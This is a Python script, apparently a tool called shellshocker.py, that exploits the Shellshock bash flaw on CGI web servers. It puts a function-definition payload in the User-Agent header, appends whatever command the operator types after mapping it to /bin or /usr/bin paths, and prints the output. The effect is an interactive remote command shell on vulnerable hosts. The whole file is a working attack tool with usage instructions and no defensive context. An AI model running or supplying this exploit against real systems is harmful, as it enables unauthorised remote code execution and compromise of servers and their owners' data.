#!/usr/bin/python
import mechanize, sys


def shellshocker(url):
	binlist = ['arch', 'awk', 'basename', 'bash', 'cat', 'chgrp', 'chmod', 'chown', 'cp', 'cpio', 'cut', 'dash', 'date', 'dd', 'df', 'dmesg', 'dnsdomainname', 'domainname', 'dumpkeys', 'echo', 'egrep', 'env', 'ex', 'false', 'fgrep', 'find', 'findmnt', 'fusermount', 'gawk', 'gettext', 'grep', 'gtar', 'gunzip', 'gzip', 'hostname', 'ipcalc', 'iptables-xml', 'iptables-xml-1.4.7', 'kbd_mode', 'kill', 'link', 'ln', 'loadkeys', 'login', 'ls', 'lsblk', 'mkdir', 'mknod', 'mktemp', 'more', 'mount', 'mountpoint', 'mv', 'netstat', 'nice', 'nisdomainname', 'ping', 'ping6', 'plymouth', 'ps', 'pwd', 'raw', 'readlink', 'rm', 'rmdir', 'rpm', 'rvi', 'rview', 'sed', 'setfont', 'sh', 'sleep', 'sort', 'stty', 'su', 'sync', 'tar', 'taskset', 'touch', 'tracepath', 'tracepath6', 'true', 'ulockmgr_server', 'umount', 'uname', 'unicode_start', 'unicode_stop', 'unlink', 'usleep', 'vi', 'view', 'ypdomainname', 'zcat']
	usrbinlist = ['a2p', 'ab', 'aclocal', 'addftinfo', 'addr2line', 'ar', 'as', 'attr', 'aulast', 'aulastlog', 'ausyscall', 'autoconf', 'autoheader', 'autom4te', 'automake', 'automake-1.11', 'autopoint', 'autoreconf', 'autoscan', 'autoupdate', 'auvirt', 'awk', 'base64', 'bashbug-64', 'berkeley_db_svc', 'bunzip2', 'bzcat', 'bzcmp', 'bzdiff', 'bzgrep', 'bzip2', 'bzip2recover', 'bzless', 'bzmore', 'c++', 'c++filt', 'c2ph', 'c89', 'c99', 'cal', 'captoinfo', 'catchsegv', 'cc', 'certutil', 'chacl', 'chage', 'chattr', 'chcon', 'checkmodule', 'checkpolicy', 'chfn', 'chrt', 'chsh', 'chvt', 'cifsiostat', 'cksum', 'clear', 'cloog', 'cmp', 'cmsutil', 'col', 'colcrt', 'colrm', 'column', 'comm', 'compile_et', 'cpp', 'crlutil', 'crontab', 'csplit', 'curl', 'curl-config', 'cut', 'cvs', 'cvsbug', 'db_archive', 'db_checkpoint', 'db_codegen', 'db_deadlock', 'db_dump', 'db_dump185', 'db_hotbackup', 'db_load', 'db_printlog', 'db_recover', 'db_stat', 'db_upgrade', 'db_verify', 'dbus-binding-tool', 'ddate', 'deallocvt', 'diff', 'diff3', 'dir', 'dircolors', 'dirname', 'dprofpp', 'du', 'enc2xs', 'env', 'envsubst', 'eqn', 'eqn2graph', 'expand', 'expr', 'factor', 'fallocate', 'fgconsole', 'file', 'find', 'find2perl', 'fipscheck', 'fipshmac', 'flock', 'floppy', 'fmt', 'fold', 'free', 'funzip', 'fusermount', 'g++', 'gawk', 'gcc', 'gcore', 'gcov', 'gdb', 'gdb-add-index', 'gdbtui', 'gencat', 'geqn', 'getconf', 'getent', 'getfacl', 'getfattr', 'getkeycodes', 'getopt', 'gettext', 'gettext.sh', 'gettextize', 'gindxbib', 'git', 'git-cvsserver', 'git-receive-pack', 'git-shell', 'git-upload-archive', 'git-upload-pack', 'glookbib', 'gmake', 'gneqn', 'gnroff', 'gpasswd', 'gpg', 'gpg-agent', 'gpg-connect-agent', 'gpg-error', 'gpg-zip', 'gpg2', 'gpgconf', 'gpgkey2ssh', 'gpgparsemail', 'gpgsplit', 'gpgv', 'gpgv2', 'gpic', 'gprof', 'grefer', 'grn', 'grodvi', 'groff', 'groffer', 'grog', 'grolbp', 'grolj4', 'grops', 'grotty', 'groups', 'gsoelim', 'gss-client', 'gstack', 'gtbl', 'gtroff', 'gunzip', 'gzexe', 'gzip', 'h2ph', 'h2xs', 'head', 'hexdump', 'hostid', 'hpftodit', 'htdbm', 'htdigest', 'htpasswd', 'i386', 'iconv', 'id', 'idn', 'ifnames', 'igawk', 'indxbib', 'info', 'infocmp', 'infokey', 'infotocap', 'install', 'instmodsh', 'ionice', 'iostat', 'ipcmk', 'ipcrm', 'ipcs', 'isosize', 'join', 'kbdrate', 'kill', 'killall', 'krb5-config', 'last', 'lastb', 'lastlog', 'lchfn', 'lchsh', 'ld', 'ldd', 'less', 'lessecho', 'lesskey', 'lesspipe.sh', 'libnetcfg', 'linux32', 'linux64', 'lkbib', 'loadunimap', 'locale', 'localedef', 'logger', 'logname', 'logresolve', 'look', 'lookbib', 'lsattr', 'lscpu', 'lua', 'luac', 'm4', 'mailq', 'mailq.postfix', 'make', 'mapscrn', 'mbchk', 'mcookie', 'md5sum', 'mesg', 'mkfifo', 'modutil', 'mpstat', 'msgattrib', 'msgcat', 'msgcmp', 'msgcomm', 'msgconv', 'msgen', 'msgexec', 'msgfilter', 'msgfmt', 'msggrep', 'msghack', 'msginit', 'msgmerge', 'msgunfmt', 'msguniq', 'namei', 'nc', 'neqn', 'newaliases', 'newaliases.postfix', 'newgrp', 'ngettext', 'nl', 'nm', 'nohup', 'nproc', 'nroff', 'objcopy', 'objdump', 'od', 'oldfind', 'open', 'openssl', 'openvt', 'passwd', 'paste', 'pathchk', 'pcregrep', 'pcretest', 'peekfd', 'perl', 'perl5.10.1', 'perlbug', 'perldoc', 'perlivp', 'perlthanks', 'pfbtops', 'pgawk', 'pgrep', 'pic', 'pic2graph', 'piconv', 'pidstat', 'pinentry', 'pinentry-curses', 'pinky', 'pk12util', 'pkg-config', 'pkill', 'pl2pm', 'plymouth', 'pmap', 'pod2html', 'pod2latex', 'pod2man', 'pod2text', 'pod2usage', 'podchecker', 'podselect', 'post-grohtml', 'ppl-config', 'pr', 'pre-grohtml', 'printenv', 'printf', 'protoize', 'prove', 'psed', 'psfaddtable', 'psfgettable', 'psfstriptable', 'psfxtable', 'pstack', 'pstree', 'pstree.x11', 'pstruct', 'ptx', 'pwdx', 'pydoc', 'python', 'python2', 'python2.6', 'ranlib', 'rcs2log', 'readelf', 'readlink', 'recode-sr-latin', 'refer', 'rename', 'renice', 'reset', 'resizecons', 'rev', 'rhgb-client', 'rmail', 'rmail.postfix', 'rpcgen', 'rpm2cpio', 'rpmdb', 'rpmquery', 'rpmsign', 'rpmverify', 'run-parts', 'runcon', 's2p', 'sadf', 'sar', 'sclient', 'scp', 'script', 'scriptreplay', 'sdiff', 'secon', 'sedismod', 'sedispol', 'semodule_deps', 'semodule_expand', 'semodule_link', 'semodule_package', 'seq', 'setarch', 'setfacl', 'setfattr', 'setkeycodes', 'setleds', 'setmetamode', 'setsid', 'setterm', 'setup-nsssysinit.sh', 'sftp', 'sg', 'sha1sum', 'sha224sum', 'sha256sum', 'sha384sum', 'sha512sum', 'showconsolefont', 'showkey', 'shred', 'shuf', 'signtool', 'signver', 'sim_client', 'size', 'skill', 'slabtop', 'slogin', 'snice', 'soelim', 'splain', 'split', 'sprof', 'sqlite3', 'ssh', 'ssh-add', 'ssh-agent', 'ssh-copy-id', 'ssh-keygen', 'ssh-keyscan', 'ssltap', 'stat', 'stdbuf', 'strings', 'strip', 'sudo', 'sudoedit', 'sudoreplay', 'sum', 'tabs', 'tac', 'tail', 'tailf', 'tbl', 'tee', 'test', 'tfmtodit', 'tic', 'timeout', 'tload', 'toe', 'top', 'tput', 'tr', 'troff', 'truncate', 'tset', 'tsort', 'tty', 'tzselect', 'ul', 'ulockmgr_server', 'unexpand', 'uniq', 'unprotoize', 'unshare', 'unzip', 'unzipsfx', 'uptime', 'urlgrabber', 'users', 'utmpdump', 'uuclient', 'uuidgen', 'vdir', 'vmstat', 'w', 'wall', 'watch', 'watchgnupg', 'wc', 'wget', 'whereis', 'which', 'whiptail', 'who', 'whoami', 'write', 'x86_64', 'x86_64-redhat-linux-c++', 'x86_64-redhat-linux-g++', 'x86_64-redhat-linux-gcc', 'xargs', 'xgettext', 'xmlcatalog', 'xmllint', 'xmlwf', 'xsubpp', 'xxd', 'yes', 'yum', 'zcmp', 'zdiff', 'zegrep', 'zfgrep', 'zforce', 'zgrep', 'zipgrep', 'zipinfo', 'zless', 'zmore', 'znew', 'zsoelim']


	useragent = '() { a;};echo \"Content-type: text/plain\"; echo; echo;'

	getcommand = raw_input("shellshock/command$ ")

	command1 = getcommand.split(' ',1)[0]

	try:
		command2 = getcommand.split(' ',1)[1]
	except:
		command2 =''

	if command1 in binlist:
		command1 = "/bin/"+command1
	elif command1 in usrbinlist:
		command1 = "/usr/bin/"+command1

	# Browser
	br = mechanize.Browser()
	# User Agent
	br.addheaders = [("User-agent",useragent+command1+" "+command2),
						('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]

	output = br.open(url).read()
	print output

def main():
	try:
		while 1:
			shellshocker(sys.argv[1])
	except:
		if len(sys.argv[1]) < 1:
			print "Using ERROR:\nHow to use example: 'python shellshocker.py http://example.com/cgi-bin/cat'\n"
		else:
			print "\nAborted / Invulnerable\n"

main()
